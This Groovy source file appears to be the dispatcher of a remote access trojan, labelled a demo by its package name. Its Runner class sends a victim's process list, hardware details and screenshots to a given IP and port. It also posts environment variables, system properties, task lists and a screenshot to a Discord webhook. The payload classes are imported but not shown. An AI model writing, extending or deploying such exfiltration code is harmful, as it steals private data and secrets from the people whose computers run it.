package de.tudbut.ttd.ratdemo

import de.tudbut.ttd.ratdemo.discord.DiscordSender
import de.tudbut.ttd.ratdemo.discord.impl.*
import de.tudbut.ttd.ratdemo.payload.Sender
import de.tudbut.ttd.ratdemo.payload.impl.HardwarePayload
import de.tudbut.ttd.ratdemo.payload.impl.ScreenPayload
import de.tudbut.ttd.ratdemo.payload.impl.TaskPayload

class Runner {

    static void start(String ip, int port, String webhook) {
        if(Main.debug)
            println 'Starting selected clients...'

        if(ip != null) {
            Sender sender = new Sender(ip, port)
            if(Main.debug)
                println 'Started ip client...'
            sender.sendPayload(new TaskPayload())
            sender.sendPayload(new HardwarePayload())
            sender.sendPayload(new ScreenPayload())
        }

        if (webhook != null) {
            DiscordSender discordSender = new DiscordSender(webhook)
            if(Main.debug)
                println 'Started discord client...'
            discordSender.send(new DEnvPayload())
            discordSender.send(new DPropertiesPayload())
            discordSender.send(new DTaskTCNPayload())
            discordSender.send(new DTaskJSONPayload())
            discordSender.send(new DScreenPayload())
        }

        if(Main.debug)
            println 'DONE'
    }
}
